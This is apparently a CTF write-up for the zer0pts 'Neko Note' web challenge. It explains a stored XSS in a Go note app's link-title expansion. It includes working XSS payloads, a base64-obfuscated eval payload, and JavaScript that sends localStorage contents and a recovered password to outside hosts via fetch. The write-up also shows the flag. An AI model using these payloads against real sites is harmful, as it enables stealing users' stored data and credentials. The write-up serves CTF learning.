---
title: "zer0pts (Web) - Neko Note"
date: "2024-11-07"
tags:
  - writeups
  - ctf
  - js
  - xss
  - Go
toc: true
math: true
bold: 
nomenu: false
---

I spent way too much time on this challenge but it was a really good one. We would start with a simple web page that has a basic form that you ca use to create notes. The form consists of 3 things, title, body and ...a *password*?! The password part was odd but lets continue.. You can also specify a "link" to other note via the square brackets like `[6f16cd75-c50d-4ea2-b845-a085ff982a57]` that UUID would be the identifier of the other note that you wan to link, and the interesting part here is that it expands its title, so if you put that UUID in your body, whenever you request the note you would get a link with the note's title.

I've spent good amount of time playing with it, and I quickly found the XSS...but not the one that I need to actually exploit that, I found the XSS in the success message, it was a bit misleading to me but I quickly realized that this is not the path whenever I looked in the source code.

I glanced at the bot's code to see where the flag is located and I saw that the flag is actually a note that the bot posts, and the other part is that the note is protected with a random password. So now we have 2 problems that we need to solve.

- How do I get the UUID of note that the bot has created?
- How do I get the password for it?

We can see that the bot does the following:

```js
await page.type('#title', 'Flag');
await page.type('#body', `The flag is: ${FLAG}`);
const password = crypto.randomBytes(64).toString('base64');
await page.type('#password', password);

await page.click('#submit');

// let's check the reported note
await page.goto(`${BASE_URL}/note/${id}`);
if (await page.$('input') != null) {
	// the note is locked, so use master key to unlock
	await page.type('input', MASTER_KEY);
	await page.click('button');

	// just in case there is a vuln like XSS, delete the password to prevent it from being stolen
	const len = (await page.$eval('input', el => el.value)).length;
	await page.focus('input');
	for (let i = 0; i < len; i++) {
		await page.keyboard.press('Backspace');
	}
}

// it's ready now. click "Show the note" button
await page.click('button');
```

Now the interesting part is the `await page.keyboard.press('Backspace');` that adds a bit more complexity but I am pretty sure that we can just use "undo" in [execCommand#undo](https://developer.mozilla.org/en-US/docs/Web/API/Document/) to solve this, but that for later. Let's actually figure out how the notes are being handled.

First off, let's check what is the note creation workflow. We would issue a PUT request to `/api/note/new`, with `multipart/form-data` that looks like this:

```http
PUT /api/note/new HTTP/1.1
Host: http://google.com/
Content-Length: 366
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; Valve Steam Client/default/1685488080) 
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAathc2UBgTcyl0Js
Accept: */*
Origin: http://google.com:8005/
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://google.com/
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9

------WebKitFormBoundaryAathc2UBgTcyl0Js
Content-Disposition: form-data; name="title"

wh
------WebKitFormBoundaryAathc2UBgTcyl0Js
Content-Disposition: form-data; name="body"

at the fuck
------WebKitFormBoundaryAathc2UBgTcyl0Js
Content-Disposition: form-data; name="password"

(╯°□°)╯︵ ┻━┻ 
------WebKitFormBoundaryAathc2UBgTcyl0Js--
```

Then this request goes to `createNoteHandler` that eventually returns the UUID of the note 

```json
{
    "id": "9e7e4c5c-aa2c-44b0-a8aa-4a60d24b12a0",
    "status": "ok"
}
```

The `showMessage` function would give us the link to that note, and then when we click it the request would be handled by `getNoteHandler`. So let's see how our note is getting rendered there.

```go
func getNoteHandler(c *gin.Context) {
	id := c.Param("id")
	if !uuidPattern.MatchString(id) {
		c.JSON(http.StatusBadRequest, gin.H{
			"status":  "error",
			"message": "Given ID is not a UUID",
		})
		return
	}

	note, ok := notes[id]
	if !ok {
		c.JSON(http.StatusNotFound, gin.H{
			"status":  "error",
			"message": "Note not found",
		})
		return
	}

	// if note is locked, body should not be sent
	if note.Locked {
		note.Body = ""
	}
	note.Body = renderNote(note.Body)

	c.JSON(http.StatusOK, gin.H{
		"status": "ok",
		"note":   note,
	})
}
```

We first check if the id matches the regex UUID pattern, if everything is okay we would fetch the id from the map and render its body with the function `renderNote`, lets check how exactly.

```go
func renderNote(note string) string {
	note = html.EscapeString(note)
	note = strings.ReplaceAll(note, "\n", "<br>")
	note = replaceLinks(note)
	return note
}
```

So we first, escape the note's body then we replace the newlines with BRRrrr... and then ...we `replaceLinks`? Let's see how..

```go
func replaceLinks(note string) string {
	return linkPattern.ReplaceAllStringFunc(note, func(s string) string {
		id := strings.Trim(s, "[]")

		note, ok := notes[id]
		if !ok {
			return s
		}

		title := html.EscapeString(note.Title)
		return fmt.Sprintf("<a href=/note/%s title=%s>%s</a>", id, title, title,)
	})
}
```

Okay, the first YELLOW bulb is here! I would admit that I didn't spot it at first but the `title=%s` part is VERY odd, why would you need that... UNLESS!

So let's try to inject something and see how it acts.

We would first create a note with some payload, then we would copy the UUID of that note and then create another one with the link to that note, in that way we would reach the `replaceLinks` code and we would inject something in the `title` attribute.

Now here I've began to struggle to inject anything, but I eventually found the XSS with some trial and error using [XSS CheatSheet by PortSwigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) I've choose the tag "a" and then began to see what works with it, until I've eventually found the grail called "`onfocus autofocus tabindex=1`". With these extraordinary attributes I was able to trigger an alert.

So the payload that I've crafted is the following:

```
a onfocus=alert(1) autofocus tabindex=1
```

That triggers an alert whenever you click, "Show the Note". Perfect, now we need to see how to extract the bot's notes. Let's check how they are stored.

We can see the JS function `addHistory();` which apparently adds the notes in the local storage as JSON.

```js
function getHistory() {
	const res = localStorage.getItem('neko-note-history');
	if (res === null) {
		return [];
	}
	return JSON.parse(res);
}
function setHistory(hist) {
	localStorage.setItem('neko-note-history', JSON.stringify(hist))
}
// NSA CODE not shown
function addHistory(id, title) {
	let hist = getHistory();
	hist.push({ id, title });
	setHistory(hist);
	renderHistory(id, title);
}
```

So we first need to exfiltrate the bot's notes, I've crafted (not the copilot) this code to do so:

```js
for(var i=0, len=localStorage.length; i<len; i++) {
	var key = localStorage.key(i);
	var value = localStorage[key];
	fetch('http://mymentalinstitution.google.com/?d=' + localStorage.key(i) + '&localStorage[key]=' + value)
}
```

Now I've encoded it with base64 and send the payload.

```
s onfocus=eval(atob('Zm9yKHZhciBpPTAsIGxlbj1sb2NhbFN0b3JhZ2UubGVuZ3RoOyBpPGxlbjsgaSsrKSB7Cgl2YXIga2V5ID0gbG9jYWxTdG9yYWdlLmtleShpKTsKCXZhciB2YWx1ZSA9IGxvY2FsU3RvcmFnZVtrZXldOwoJZmV0Y2goJ2h0dHA6Ly9teW1lbnRhbGluc3RpdHV0aW9uLmdvb2dsZS5jb20vP2Q9JyArIGxvY2FsU3RvcmFnZS5rZXkoaSkgKyAnJmxvY2FsU3RvcmFnZVtrZXldPScgKyB2YWx1ZSkKfQ==')) autofocus tabindex=1
```

> Note: We need to escape the first attribute in the title here: `<a href=/note/%s title=%s>%s</a>` so adding a single letter with space would do the trick

Now create a note with that title, link it with another note, and then report it to the admin.

We would see some requests coming in:

```
microsoft.com - - [08/Nov/2024 17:54:22] "GET /?d=neko-note-history&localStorage[key]=[{%22id%22:%22161d00ba-6784-4898-8ece-bdc9951120fa%22,%22title%22:%22Flag%22}] HTTP/1.1" 200 -
```

Now we got the Flag's note id, now we need the password for it, we know that the bot is magically deleting it using the backspace we need to find a way to UNDO that!

Since that the payload gets run whenever we click on Show the Note, we can safely assume that the password is being typed already. In that case we can just get the input field and send the "undo" command. So the next payload that we are going to do is this one:

```js
document.querySelectorAll('input').forEach(input => {
    document.execCommand('undo');
    fetch('http://2.tcp.eu.ngrok.io:17610/?d=' + input.value);
});
```

And redo the steps that we already did for the first payload. After the report to the admin we would get password for the note.

```
microsoft.com - - [08/Nov/2024 17:55:33] "GET /?d=ae4eadec-3bc0-4884-8ffb-f997a41d35b4 HTTP/1.1" 200 
```

And we can input it and get the flag.

```
zer0pts{neko_no_te_mo_karitai_m8jYx9WiTDY}
```

